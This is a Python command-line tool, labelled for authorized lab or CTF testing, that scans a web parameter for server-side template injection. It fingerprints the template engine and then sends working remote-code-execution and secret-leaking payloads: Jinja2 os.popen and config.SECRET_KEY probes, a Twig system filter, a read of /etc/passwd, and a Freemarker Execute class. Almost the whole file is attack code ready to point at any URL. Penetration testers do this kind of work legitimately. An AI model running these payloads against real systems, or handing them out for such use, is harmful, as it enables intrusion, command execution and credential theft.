#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""Server-Side Template Injection (SSTI) detection agent using requests."""

import argparse
import json
import logging
import sys
import urllib.parse
from typing import List, Optional

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

DETECTION_PAYLOADS = {
    "jinja2_twig": {"payload": "{{7*7}}", "expected": "49"},
    "freemarker": {"payload": "${7*7}", "expected": "49"},
    "thymeleaf": {"payload": "#{7*7}", "expected": "49"},
    "erb_ejs": {"payload": "<%= 7*7 %>", "expected": "49"},
    "smarty": {"payload": "{7*7}", "expected": "49"},
    "velocity": {"payload": "#set($x=7*7)$x", "expected": "49"},
    "dotjs": {"payload": "{{= 7*7}}", "expected": "49"},
}

ENGINE_FINGERPRINTS = {
    "jinja2": {"payload": "{{7*'7'}}", "expected": "7777777"},
    "twig": {"payload": "{{7*'7'}}", "expected": "49"},
    "freemarker_confirm": {"payload": "${.now}", "match_pattern": r"\d{4}"},
    "flask_config": {"payload": "{{config}}", "match_pattern": r"SECRET_KEY|DEBUG"},
}


def test_ssti_detection(url: str, param: str, method: str = "GET",
                         headers: Optional[dict] = None) -> List[dict]:
    """Test all detection payloads against a parameter."""
    results = []
    for engine, test in DETECTION_PAYLOADS.items():
        payload = test["payload"]
        expected = test["expected"]
        resp = _send_payload(url, param, payload, method, headers)
        found = expected in resp.text
        results.append({
            "engine_hint": engine,
            "payload": payload,
            "expected": expected,
            "found_in_response": found,
            "status_code": resp.status_code,
        })
        if found:
            logger.warning("SSTI detected with %s payload: %s", engine, payload)
    return results


def identify_engine(url: str, param: str, method: str = "GET",
                     headers: Optional[dict] = None) -> dict:
    """Identify the specific template engine in use."""
    import re

    resp_jinja = _send_payload(url, param, "{{7*'7'}}", method, headers)
    if "7777777" in resp_jinja.text:
        return {"engine": "Jinja2", "language": "Python", "framework": "Flask/Django"}
    if "49" in resp_jinja.text:
        return {"engine": "Twig", "language": "PHP", "framework": "Symfony/Laravel"}

    resp_fm = _send_payload(url, param, "${.now}", method, headers)
    if re.search(r"\d{4}", resp_fm.text):
        return {"engine": "Freemarker", "language": "Java", "framework": "Spring"}

    resp_config = _send_payload(url, param, "{{config}}", method, headers)
    if "SECRET_KEY" in resp_config.text or "DEBUG" in resp_config.text:
        return {"engine": "Jinja2", "language": "Python", "framework": "Flask"}

    resp_velocity = _send_payload(url, param, "#set($x=42)$x", method, headers)
    if "42" in resp_velocity.text:
        return {"engine": "Velocity", "language": "Java", "framework": "Apache Velocity"}

    return {"engine": "unknown"}


def test_jinja2_rce(url: str, param: str, method: str = "GET",
                     headers: Optional[dict] = None) -> List[dict]:
    """Test Jinja2 RCE payloads."""
    payloads = [
        {"name": "cycler_popen", "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
        {"name": "lipsum_popen", "payload": '{{lipsum.__globals__["os"].popen("id").read()}}'},
        {"name": "config_items", "payload": "{{config.items()}}"},
        {"name": "secret_key", "payload": "{{config.SECRET_KEY}}"},
    ]
    results = []
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        has_output = (
            "uid=" in resp.text or "SECRET_KEY" in resp.text or
            "root" in resp.text or len(resp.text) > 500
        )
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": "uid=" in resp.text,
            "info_leak": "SECRET_KEY" in resp.text or "config" in resp.text.lower(),
            "response_preview": resp.text[:200],
        })
    return results


def test_twig_rce(url: str, param: str, method: str = "GET",
                   headers: Optional[dict] = None) -> List[dict]:
    """Test Twig (PHP) RCE payloads."""
    payloads = [
        {"name": "filter_system", "payload": "{{['id']|filter('system')}}"},
        {"name": "file_excerpt", "payload": "{{'/etc/passwd'|file_excerpt(1,5)}}"},
    ]
    results = []
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": "uid=" in resp.text or "root:" in resp.text,
            "response_preview": resp.text[:200],
        })
    return results


def test_freemarker_rce(url: str, param: str, method: str = "GET",
                         headers: Optional[dict] = None) -> List[dict]:
    """Test Freemarker (Java) RCE payloads."""
    payloads = [
        {"name": "execute_class",
         "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'},
    ]
    results = []
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        results.append({
            "name": p["name"],
            "status_code": resp.status_code,
            "rce_confirmed": "uid=" in resp.text,
            "response_preview": resp.text[:200],
        })
    return results


def _send_payload(url: str, param: str, payload: str, method: str = "GET",
                   headers: Optional[dict] = None) -> requests.Response:
    h = headers or {}
    encoded = urllib.parse.quote(payload)
    try:
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            return requests.get(f"{url}{sep}{param}={encoded}", headers=h,
                                timeout=10, verify=False)
        else:
            return requests.post(url, data={param: payload}, headers=h,
                                  timeout=10, verify=False)
    except requests.RequestException:
        return type("R", (), {"status_code": 0, "text": "", "content": b""})()


def run_assessment(url: str, param: str, method: str = "GET") -> dict:
    """Run complete SSTI assessment."""
    detection = test_ssti_detection(url, param, method)
    vulnerable = any(d["found_in_response"] for d in detection)

    result = {
        "target": url, "parameter": param, "vulnerable": vulnerable,
        "detection_results": detection,
    }
    if vulnerable:
        engine = identify_engine(url, param, method)
        result["engine"] = engine
        if engine.get("engine") == "Jinja2":
            result["rce_tests"] = test_jinja2_rce(url, param, method)
        elif engine.get("engine") == "Twig":
            result["rce_tests"] = test_twig_rce(url, param, method)
        elif engine.get("engine") == "Freemarker":
            result["rce_tests"] = test_freemarker_rce(url, param, method)

    return result


def main():
    parser = argparse.ArgumentParser(description="SSTI Detection Agent")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Parameter to test")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--output", default="ssti_report.json")
    args = parser.parse_args()

    report = run_assessment(args.url, args.param, args.method)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
